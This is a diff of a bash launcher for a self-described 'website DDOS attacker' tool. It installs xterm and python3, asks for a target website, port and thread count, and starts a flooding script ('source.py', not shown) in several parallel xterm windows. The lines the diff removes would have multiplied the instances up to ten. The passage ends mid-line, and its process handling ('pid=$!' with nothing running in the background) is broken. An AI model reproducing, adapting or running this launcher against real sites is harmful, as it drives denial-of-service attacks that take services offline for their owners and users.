@@ -26,63 +26,52 @@ echo -e "##$red-------------MOST POWERFULL WEBSITE DDOS ATTACKER------------BY S
 echo -e "$Cafe##############################################################################$nc"
 echo -e "$cyan Author :-SURAJ CHAVDA$nc"
 
-
-
-
-                                                                                
 if xterm -version &>/dev/null; then
     echo -e "$purple xterm is installed ✅ $nc"
 else
-echo -e "\e[94mXTERM Is Installing.......\e[0m"
-progressbar()
-{
-    bar="##################################################"
-    barlength=${#bar}
-    n=$(($1*barlength/100))
-    printf "\r[%-${barlength}s (%d%%)] " "${bar:0:n}" "$1" 
-}
+    echo -e "\e[94mXTERM Is Installing.......\e[0m"
+    progressbar() {
+        bar="##################################################"
+        barlength=${#bar}
+        n=$(($1*barlength/100))
+        printf "\r[%-${barlength}s (%d%%)] " "${bar:0:n}" "$1" 
+    }
 
+    pid=$!
+    apt-get install xterm > /dev/null
 
-pid=$!
+    for i in $(seq 1 100); do
+        progressbar $i
+        sleep 0.1
+    done 
 
-apt-get install xterm > /dev/null
-
-for i in `seq 1 100`;
-do
-    progressbar $i
-    sleep 0.1
-done 
-# kill the spinner task
-kill $pid > /dev/null 2>&1
-echo $'\n*\n*\n\e[97mXTERM Successfully Installed on Your OS\e[0m'
+    kill $pid > /dev/null 2>&1
+    echo $'\n*\n*\n\e[97mXTERM Successfully Installed on Your OS\e[0m'
 fi  
+
 if command -v python3 &>/dev/null; then
     echo -e "$purple Python 3 is installed ✅$nc"
 else
+    echo -e "\e[94mPython3 Is Installing.......\e[0m"
+    progressbar() {
+        bar="##################################################"
+        barlength=${#bar}
+        n=$(($1*barlength/100))
+        printf "\r[%-${barlength}s (%d%%)] " "${bar:0:n}" "$1" 
+    }
 
-echo -e "\e[94mPython3 Is Installing.......\e[0m"
-progressbar()
-{
-    bar="##################################################"
-    barlength=${#bar}
-    n=$(($1*barlength/100))
-    printf "\r[%-${barlength}s (%d%%)] " "${bar:0:n}" "$1" 
-}
+    pid=$!
+    apt-get install python3 > /dev/null
 
+    for i in $(seq 1 100); do
+        progressbar $i
+        sleep 0.1
+    done  
 
-pid=$!
-
-apt-get install python3 > /dev/null
-
-for i in `seq 1 100`;
-do
-    progressbar $i
-    sleep 0.1
-done  
-# kill the spinner task
-kill $pid > /dev/null 2>&1 
-echo $'\n*\n*\n\e[97mPython3 Successfully Installed on Your OS\e[0m'
+    kill $pid > /dev/null 2>&1 
+    echo $'\n*\n*\n\e[97mPython3 Successfully Installed on Your OS\e[0m'
 fi
+
 read -p $'\033[0;37mEnter The Website\e[0m     :- ' web
 read -p $'\033[0;37mEnter The Port  \e[0m      :- ' port
 read -p $'\033[0;37mEnter The Thread[133]\e[0m :- ' thread
@@ -104,66 +93,8 @@ echo "##################################################################"
 echo -e "---------------------------"
 read -p "ENTER MODE NUMBER ⤴  :- " SA
 
-
-
 if [ $SA = 1 ]; then
-xterm -e python3 source.py -s $web -p $port -t $thread &
+    xterm -e python3 source.py -s $web -p $port -t $thread &
 fi
 
-if [ $SA = 2 ]; then
-for i in {1..2}
-do xterm -e python3 source.py -s $web -p $port -t $thread &
-done
-
-
-fi
-if [ $SA = 3 ]; then
-for i in {1..3}
-do xterm -e python3 source.py -s $web -p $port -t $thread &
-done
-fi
-
-if [ $SA = 4 ]; then
-for i in {1..4}
-do xterm -e python3 source.py -s $web -p $port -t $thread &
-done
-fi
-if [ $SA = 5 ]; then
-for i in {1..5}
-do xterm -e python3 source.py -s $web -p $port -t $thread &
-done
-fi
-if [ $SA = 6 ]; then
-for i in {1..6}
-do xterm -e python3 source.py -s $web -p $port -t $thread &
-done
-fi
-
-if [ $SA = 7 ]; then
-for i in {1..7}
-do xterm -e python3 source.py -s $web -p $port -t $thread &
-done
-fi
-
-if [ $SA = 8 ]; then
-for i in {1..8}
-do xterm -e python3 source.py -s $web -p $port -t $thread &
-done
-fi
-
-if [ $SA = 9 ]; then
-for i in {1..9}
-do xterm -e python3 source.py -s $web -p $port -t $thread &
-done
-fi
-
-if [ $SA = 10 ]; then
-for i in {1..10}
-do xterm -e python3 source.py -s $web -p $port -t $thread &
-done
-fi
-echo "$red DDOS CLOSED $nc"
-
-
-
-
+if [ $SA = 2
